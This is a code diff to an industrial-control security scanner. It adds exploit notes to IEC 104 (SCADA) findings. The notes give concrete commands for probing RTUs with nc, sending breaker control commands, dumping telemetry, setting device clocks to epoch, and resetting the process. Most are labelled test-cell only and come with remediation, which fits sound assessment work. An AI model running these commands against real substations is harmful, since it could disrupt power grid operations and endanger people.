@@ -664,10 +664,12 @@ def iec104_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "iec104ctl", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -702,7 +704,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 "firewall that restricts source addresses and, where the "
                 "device supports it, enforce IEC 62351-3 TLS with client "
                 "certificates on every session.",
-                ["CWE-284", "CWE-923"], kind="iec104_reachable"))
+                ["CWE-284", "CWE-923"], kind="iec104_reachable",
+                exploit_note=(
+                    "printf '\\x68\\x04\\x43\\x00\\x00\\x00' | nc <ip> 2404 | "
+                    "xxd (TESTFR act); nmap --script iec-identify -p 2404 <ip>."),
+                depth_tier="t1"))
 
             # STARTDT accepted with no credentials.
             if pr.get("startdt_ok"):
@@ -723,7 +729,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "supports IEC 62351-3, enforce TLS with mutual "
                     "certificate authentication and disable plain 2404 "
                     "entirely.",
-                    ["CWE-306", "CWE-319"], kind="iec104_startdt_accepted"))
+                    ["CWE-306", "CWE-319"], kind="iec104_startdt_accepted",
+                    exploit_note=(
+                        "TEST-CELL ONLY: iec104ctl <ip>:2404 single-command "
+                        "--caa 1 --ioa <known_test_ioa> --on. NEVER on live "
+                        "substations."),
+                    depth_tier="t2"))
 
             # General Interrogation process-image dump.
             hits = pr.get("interrogation") or []
@@ -747,7 +758,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "authentication on the SCADA transport, or front the RTU "
                     "with a source-IP-restricted proxy. General interrogation "
                     "from an unauthorised source is a segmentation failure.",
-                    ["CWE-306", "CWE-200"], kind="iec104_process_image_readable"))
+                    ["CWE-306", "CWE-200"], kind="iec104_process_image_readable",
+                    exploit_note=(
+                        "iec104ctl <ip>:2404 interrogation --caa <caa> --for 60 "
+                        "(log all telemetry for 60s); identify high-value IOAs "
+                        "(breakers/isolators) by IOA range convention (per site)."),
+                    depth_tier="t2"))
 
             # CAA enumeration.
             alive = pr.get("caa_alive") or []
@@ -791,7 +807,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "allowlist at the substation boundary and log every "
                     "control ASDU at the gateway.",
                     ["CWE-306", "CWE-284", "CWE-807"],
-                    kind="iec104_control_writable"))
+                    kind="iec104_control_writable",
+                    exploit_note=(
+                        "TEST-CELL ONLY: iec104ctl <ip>:2404 single-command "
+                        "--caa 1 --ioa <ioa> --on; observe the corresponding "
+                        "M_SP change in the next interrogation. Never on "
+                        "production."),
+                    depth_tier="t1"))
 
             # Actual clock write (only when write=True was passed).
             if pr.get("clock_sync_accepted"):
@@ -811,7 +833,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "the master's source at the boundary and require an "
                     "external, trusted time source (PTP with authenticated "
                     "grandmaster) rather than the SCADA transport.",
-                    ["CWE-306", "CWE-345"], kind="iec104_clock_writable"))
+                    ["CWE-306", "CWE-345"], kind="iec104_clock_writable",
+                    exploit_note=(
+                        "TEST-CELL ONLY: iec104ctl <ip>:2404 clock-sync --caa "
+                        "<caa> --time '1970-01-01T00:00:00Z' (or drifted); "
+                        "verify the RTU's SOE timestamps now diverge from grid "
+                        "time."),
+                    depth_tier="t3"))
 
             if pr.get("reset_process_accepted"):
                 out.append(_finding(
@@ -826,7 +854,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"{alive[0] if alive else 1}",
                     "Restrict 2404/tcp to the master's source at the segment "
                     "boundary and enforce IEC 62351-3 with mutual auth.",
-                    ["CWE-306", "CWE-1327"], kind="iec104_reset_writable"))
+                    ["CWE-306", "CWE-1327"], kind="iec104_reset_writable",
+                    exploit_note=(
+                        "TEST-CELL ONLY: iec104ctl <ip>:2404 reset --caa <caa>; "
+                        "verify all points drop for the boot cycle. NEVER on "
+                        "production."),
+                    depth_tier="t3"))
 
             # TLS wrap check — negative outcome is the finding.
             if not pr.get("tls_handshake"):
